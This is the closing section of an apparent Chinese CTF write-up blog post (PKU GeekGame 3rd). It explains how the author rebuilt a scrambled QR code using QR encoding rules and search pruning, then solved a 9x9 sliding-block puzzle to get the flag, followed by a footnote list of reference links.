<h3 id="华维码"><a class="markdownIt-Anchor" href="#华维码"></a> 华维码</h3>
<p>Flag1: 搜索所有可能的摆放方式，并检查生成的二维码能否被正确扫描。</p>
<p>Flag2: 搜索所有可能的摆放方式，并检查生成的二维码能否被正确扫描。这个问题的关键是要了解二维码的编码方式，并进行搜索剪枝。我阅读了<a target="_blank" rel="noopener" href="https://www.thonky.com/qr-code-tutorial/">教程</a>。理解编码方式之后，可以采用以下两个搜索剪枝方案：</p>
<p>方案一：答案用 Byte Mode Encoding（因为其他编码方式都不能实现网址或者 <code>flag&#123;xxx&#125;</code>  字符串的编码）。加入这个剪枝之后，我们可以知道最终的字符串的长度是 63。</p>
<p>方案二：二维码中有很多点我们是能够确定是什么的，这就约束了某个块能够摆放的位置。在搜索的过程中，我们优先搜索摆放位置数量最少的块。我一共使用了两种方法来确定已知点。第一，定位块和对齐线是已知的，那么它们所在的点也是能确定的。第二，在 Version 7-L 中，一共有两个 blocks，每个 block 可以放 78 个 crosswords （这里的数据和术语都是来自前面说的教程），因为最终的字符串的长度是 63，小于 78-2 （-2 是因为要放置 Encoding Mode, Bytes Length 和 End of Bytes），所以第二个 block 是空的，也就是用 11101100 00010001 进行填充的（教程里说的用此 padding 填充不够长的数据）。所以我们能够确定第二个 block 对应的点。</p>
<p>解出二维码后，得到一个 <a target="_blank" rel="noopener" href="https://gist.github.com/Konano/e9f437ecc94b20005ee6defdd7d46834">gist 链接</a>，但进去后并没有 flag 的内容。我猜是出题人想我们玩一下 9X9 的格子华容道。我在网上找了一个<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/120931476">华容道开源代码</a>，并把它修改成9x9的游戏模式，手动玩一遍果然可得到 flag。</p>
<p>这题写了很长的代码，主要是一个苦力活，有很多细节要处理（比如要生成 crosswords 以 zigzag pattern 摆放的序列）。</p>
<hr class="footnotes-sep" />
<section class="footnotes">
<ol class="footnotes-list">
<li id="fn1" class="footnote-item"><p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1u8411B7wq/">遥遥领先是什么梗【梗指南】</a> <a href="#fnref1" class="footnote-backref">↩︎</a></p>
</li>
<li id="fn2" class="footnote-item"><p><a target="_blank" rel="noopener" href="https://github.com/PKU-GeekGame/geekgame-3rd/tree/master/official_writeup/prob05-zserver">https://github.com/PKU-GeekGame/geekgame-3rd/tree/master/official_writeup/prob05-zserver</a> <a href="#fnref2" class="footnote-backref">↩︎</a></p>
</li>
<li id="fn3" class="footnote-item"><p><a target="_blank" rel="noopener" href="https://github.com/PKU-GeekGame/geekgame-3rd/tree/master/problemset">https://github.com/PKU-GeekGame/geekgame-3rd/tree/master/problemset</a> <a href="#fnref3" class="footnote-backref">↩︎</a></p>
</li>
<li id="fn4" class="footnote-item"><p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/web/api/document/cookie#security">https://developer.mozilla.org/en-US/docs/web/api/document/cookie#security</a> <a href="#fnref4" class="footnote-backref">↩︎</a></p>
</li>
<li id="fn5" class="footnote-item"><p><a target="_blank" rel="noopener" href="https://oi-wiki.org/math/poly/ntt/">https://oi-wiki.org/math/poly/ntt/</a> <a href="#fnref5" class="footnote-backref">↩︎</a></p>
</li>
<li id="fn6" class="footnote-item"><p><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.9/source/fs/proc/base.c#L926">https://elixir.bootlin.com/linux/v5.9/source/fs/proc/base.c#L926</a> <a href="#fnref6" class="footnote-backref">↩︎</a></p>
</li>
<li id="fn7" class="footnote-item"><p><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.9/source/kernel/fork.c#L1217">https://elixir.bootlin.com/linux/v5.9/source/kernel/fork.c#L1217</a> <a href="#fnref7" class="footnote-backref">↩︎</a> <a href="#fnref7:1" class="footnote-backref">↩︎</a></p>
</li>
<li id="fn8" class="footnote-item"><p><a target="_blank" rel="noopener" href="https://www.kernel.org/doc/html/v4.15/admin-guide/LSM/Yama.html">https://www.kernel.org/doc/html/v4.15/admin-guide/LSM/Yama.html</a> <a href="#fnref8" class="footnote-backref">↩︎</a></p>
</li>
<li id="fn9" class="footnote-item"><p><a target="_blank" rel="noopener" href="https://github.com/PKU-GeekGame/geekgame-3rd/blob/master/official_writeup/prob07-noexec/README.md#flag-2">https://github.com/PKU-GeekGame/geekgame-3rd/blob/master/official_writeup/prob07-noexec/README.md#flag-2</a> <a href="#fnref9" class="footnote-backref">↩︎</a></p>
</li>
<li id="fn10" class="footnote-item"><p><a target="_blank" rel="noopener" href="https://github.com/arget13/DDexec">Github - arget13/DDexec</a> <a href="#fnref10" class="footnote-backref">↩︎</a></p>
</li>
<li id="fn11" class="footnote-item"><p><a target="_blank" rel="noopener" href="https://magisterquis.github.io/2018/03/31/in-memory-only-elf-execution.html">In-Memory-Only ELF Execution (Without tmpfs)</a> <a href="#fnref11" class="footnote-backref">↩︎</a></p>
</li>
<li id="fn12" class="footnote-item"><p><a target="_blank" rel="noopener" href="http://www.matrix67.com/blog/archives/544">Matrix67 经典证明：扫雷是NP完全问题</a> <a href="#fnref12" class="footnote-backref">↩︎</a></p>
</li>
<li id="fn13" class="footnote-item"><p>Minesweeper is NP-complete (2000). <a target="_blank" rel="noopener" href="https://web.mat.bham.ac.uk/R.W.Kaye/minesw/ASE2003.pdf">Slides</a> <a href="#fnref13" class="footnote-backref">↩︎</a></p>
</li>
</ol>
</section>
</div></article><div class="copyright-wrapper"><p>Date: 2023-10-19 20:58:02</p><p>Last modified: 2023-12-17 17:23:38</p><p>@ 2022 Chengke</p></div><div class="post-pager"><div class="prev"></div><div class="next"> <a href="/2023/09/24/superliminal/" title="错觉艺术：《超阈限空间》游玩感想">Next: 错觉艺术：《超阈限空间》游玩感想</a></div></div></section></section></main><footer class="footer-page"><div><span>Powered by</span><a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a><span> | Theme</span><a target="_blank" rel="noopener" href="https://github.com/wongsingfo/hexo-theme-instapaper">instapaper</a></div></footer><script src="/scripts/dark.js"></script><script src="/scripts/post.js"></script></body></html>